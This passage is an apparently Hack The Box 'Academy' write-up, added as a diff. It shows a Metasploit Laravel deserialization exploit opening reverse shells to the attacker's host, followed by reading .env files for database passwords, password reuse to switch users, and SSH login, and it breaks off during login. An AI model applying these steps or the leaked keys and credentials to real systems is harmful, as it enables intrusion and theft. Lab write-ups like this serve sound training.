+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.104:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>APP_KEY <span style="color:#f92672">=</span>&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/laravel_token_unserialize_exec<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.104:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">5</span> opened <span style="color:#f92672">(</span>10.10.14.104:4444 -&gt; 10.10.10.215:56944<span style="color:#f92672">)</span> at 2023-07-18 03:30:56 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">6</span> opened <span style="color:#f92672">(</span>10.10.14.104:4444 -&gt; 10.10.10.215:56946<span style="color:#f92672">)</span> at 2023-07-18 03:30:57 -0400
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>10.10.14.104:4444 -&gt; 10.10.10.215:56948<span style="color:#f92672">)</span> at 2023-07-18 03:30:59 -0400
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">8</span> opened <span style="color:#f92672">(</span>10.10.14.104:4444 -&gt; 10.10.10.215:56950<span style="color:#f92672">)</span> at 2023-07-18 03:31:00 -0400
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><h2 id="lateral-movement">Lateral Movement<a href="#lateral-movement" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I find the credentials for <code>mysql</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls -all
+</span></span><span style="display:flex;"><span>ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">12</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">593</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .htaccess
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> css
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> favicon.ico
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1823</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> index.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> js
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">24</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> robots.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">914</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> web.config
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/htb-academy-dev-01$ ls -all
+</span></span><span style="display:flex;"><span>ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">284</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">12</span> root root   <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">702</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> .env
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">651</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .env.example
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">111</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .gitattributes
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">155</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .gitignore
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">6</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> app
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">1686</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> artisan
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> bootstrap
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">1513</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> composer.json
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">193502</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> composer.lock
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> config
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> database
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">1150</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> package.json
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">1040</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> phpunit.xml
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> public
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">3622</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> readme.md
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> resources
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> routes
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">563</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> server.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> storage
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> tests
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">38</span> root root   <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> vendor
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">549</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> webpack.mix.js
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/htb-academy-dev-01$ cat .env
+</span></span><span style="display:flex;"><span>cat .env
+</span></span><span style="display:flex;"><span>APP_NAME<span style="color:#f92672">=</span>Laravel
+</span></span><span style="display:flex;"><span>APP_ENV<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>APP_KEY<span style="color:#f92672">=</span>base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>APP_DEBUG<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>APP_URL<span style="color:#f92672">=</span>http://localhost
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LOG_CHANNEL<span style="color:#f92672">=</span>stack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DB_CONNECTION<span style="color:#f92672">=</span>mysql
+</span></span><span style="display:flex;"><span>DB_HOST<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>DB_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>DB_DATABASE<span style="color:#f92672">=</span>homestead
+</span></span><span style="display:flex;"><span>DB_USERNAME<span style="color:#f92672">=</span>homestead
+</span></span><span style="display:flex;"><span>DB_PASSWORD<span style="color:#f92672">=</span>secret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BROADCAST_DRIVER<span style="color:#f92672">=</span>log
+</span></span><span style="display:flex;"><span>CACHE_DRIVER<span style="color:#f92672">=</span>file
+</span></span><span style="display:flex;"><span>SESSION_DRIVER<span style="color:#f92672">=</span>file
+</span></span><span style="display:flex;"><span>SESSION_LIFETIME<span style="color:#f92672">=</span><span style="color:#ae81ff">120</span>
+</span></span><span style="display:flex;"><span>QUEUE_DRIVER<span style="color:#f92672">=</span>sync
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>REDIS_HOST<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>REDIS_PASSWORD<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>REDIS_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6379</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAIL_DRIVER<span style="color:#f92672">=</span>smtp
+</span></span><span style="display:flex;"><span>MAIL_HOST<span style="color:#f92672">=</span>smtp.mailtrap.io
+</span></span><span style="display:flex;"><span>MAIL_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">2525</span>
+</span></span><span style="display:flex;"><span>MAIL_USERNAME<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>MAIL_PASSWORD<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>MAIL_ENCRYPTION<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_ID<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_KEY<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_SECRET<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_CLUSTER<span style="color:#f92672">=</span>mt1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MIX_PUSHER_APP_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PUSHER_APP_KEY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>MIX_PUSHER_APP_CLUSTER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PUSHER_APP_CLUSTER<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/htb-academy-dev-01$
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/htb-academy-dev-01$ cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>academy  htb-academy-dev-01  index.php
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html$ cd academy
+</span></span><span style="display:flex;"><span>cd academy
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>app        composer.json  database      public     routes      tests
+</span></span><span style="display:flex;"><span>artisan    composer.lock  package.json  readme.md  server.php  vendor
+</span></span><span style="display:flex;"><span>bootstrap  config         phpunit.xml   resources  storage     webpack.mix.js
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ ls -all
+</span></span><span style="display:flex;"><span>ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">280</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">12</span> www-data www-data   <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root     root       <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">706</span> Aug <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2020</span> .env
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">651</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .env.example
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">111</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .gitattributes
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">155</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> .gitignore
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">6</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> app
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">1686</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> artisan
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> bootstrap
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">1512</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> composer.json
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">191621</span> Aug  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2020</span> composer.lock
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> config
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> database
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">1150</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> package.json
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">1040</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> phpunit.xml
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> www-data www-data   <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2020</span> public
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">3622</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> readme.md
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> resources
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> routes
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">563</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> server.php
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> storage
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> www-data www-data   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> tests
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">38</span> www-data www-data   <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2020</span> vendor
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">549</span> Feb  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> webpack.mix.js
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ cat .env
+</span></span><span style="display:flex;"><span>cat .env
+</span></span><span style="display:flex;"><span>APP_NAME<span style="color:#f92672">=</span>Laravel
+</span></span><span style="display:flex;"><span>APP_ENV<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>APP_KEY<span style="color:#f92672">=</span>base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>APP_DEBUG<span style="color:#f92672">=</span>false
+</span></span><span style="display:flex;"><span>APP_URL<span style="color:#f92672">=</span>http://localhost
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LOG_CHANNEL<span style="color:#f92672">=</span>stack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DB_CONNECTION<span style="color:#f92672">=</span>mysql
+</span></span><span style="display:flex;"><span>DB_HOST<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>DB_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>DB_DATABASE<span style="color:#f92672">=</span>academy
+</span></span><span style="display:flex;"><span>DB_USERNAME<span style="color:#f92672">=</span>dev
+</span></span><span style="display:flex;"><span>DB_PASSWORD<span style="color:#f92672">=</span>mySup3rP4s5w0rd!!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BROADCAST_DRIVER<span style="color:#f92672">=</span>log
+</span></span><span style="display:flex;"><span>CACHE_DRIVER<span style="color:#f92672">=</span>file
+</span></span><span style="display:flex;"><span>SESSION_DRIVER<span style="color:#f92672">=</span>file
+</span></span><span style="display:flex;"><span>SESSION_LIFETIME<span style="color:#f92672">=</span><span style="color:#ae81ff">120</span>
+</span></span><span style="display:flex;"><span>QUEUE_DRIVER<span style="color:#f92672">=</span>sync
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>REDIS_HOST<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>REDIS_PASSWORD<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>REDIS_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6379</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAIL_DRIVER<span style="color:#f92672">=</span>smtp
+</span></span><span style="display:flex;"><span>MAIL_HOST<span style="color:#f92672">=</span>smtp.mailtrap.io
+</span></span><span style="display:flex;"><span>MAIL_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">2525</span>
+</span></span><span style="display:flex;"><span>MAIL_USERNAME<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>MAIL_PASSWORD<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>MAIL_ENCRYPTION<span style="color:#f92672">=</span>null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_ID<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_KEY<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_SECRET<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>PUSHER_APP_CLUSTER<span style="color:#f92672">=</span>mt1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MIX_PUSHER_APP_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PUSHER_APP_KEY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>MIX_PUSHER_APP_CLUSTER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PUSHER_APP_CLUSTER<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ 
+</span></span></code></pre></div><pre tabindex="0"><code>homestead:secret
+dev:mySup3rP4s5w0rd!!
+</code></pre><p>I have discover other <code>users</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ ls /home
+</span></span><span style="display:flex;"><span>21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
+</span></span></code></pre></div><p>I have a problem to connect me to mysql :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ mysql -u dev -p mySup3rP4s5w0rd!!
+</span></span><span style="display:flex;"><span>mysql -u dev -p mySup3rP4s5w0rd!!
+</span></span><span style="display:flex;"><span>mysql -u dev -p mySup3rP4s5w0rdmysql -u dev -h 127.0.0.1 -P <span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>Enter password: mySup3rP4s5w0rd!!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ERROR <span style="color:#ae81ff">1045</span> <span style="color:#f92672">(</span>28000<span style="color:#f92672">)</span>: Access denied <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;dev&#39;</span>@<span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">(</span>using password: YES<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I do any attempt and discover that the password is by <code>cry0l1t3</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ su  cry0l1t3
+</span></span><span style="display:flex;"><span>su  cry0l1t3
+</span></span><span style="display:flex;"><span>Password: mySup3rP4s5w0rd!!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>cry0l1t3
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>I find the <code>user flag</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh cry0l1t3@academy.htb         
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;academy.htb (10.10.10.215)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:hnOe1bcUjO7e/OQwjb79pf4GATiO1ov1U37KOPCkBdE.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:35: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>academy.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cry0l1t3@academy.htb&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.1 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-52-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Tue <span style="color:#ae81ff">18</span> Jul <span style="color:#ae81ff">2023</span> 07:56:43 AM UTC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:             0.0
+</span></span><span style="display:flex;"><span>  Usage of /:              44.8% of 15.68GB
+</span></span><span style="display:flex;"><span>  Memory usage:            18%
+</span></span><span style="display:flex;"><span>  Swap usage:              0%
